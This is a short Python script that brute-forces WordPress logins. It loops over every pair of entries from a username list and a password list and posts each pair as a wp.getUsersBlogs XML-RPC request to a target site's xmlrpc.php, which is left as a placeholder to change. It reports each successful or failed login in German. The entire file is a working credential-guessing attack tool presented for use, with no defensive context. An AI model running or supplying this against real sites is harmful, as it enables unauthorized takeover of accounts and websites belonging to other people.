import requests
from rich import print 


url = "https://domain.com/xmlrpc.php" # CHANGE TARGET DOMAIN


with open('usernames.txt', 'r') as file:
    usernames = file.read().splitlines()


with open('passwords.txt', 'r') as file:
    passwords = file.read().splitlines()

for username in usernames:
    for password in passwords:

        xml = """<?xml version="1.0"?>
        <methodCall>
          <methodName>wp.getUsersBlogs</methodName>
          <params>
            <param><value>{}</value></param>
            <param><value>{}</value></param>
          </params>
        </methodCall>
        """.format(username, password)
        
        
        response = requests.post(url, data=xml)
        
        if "isAdmin" in response.text:
            print("[green]Erfolgreicher Login - Benutzername: {} Passwort: {}".format(username, password))
        else:
            print("[red]Fehlgeschlagener Login - Benutzername: {} Passwort: {}".format(username, password))
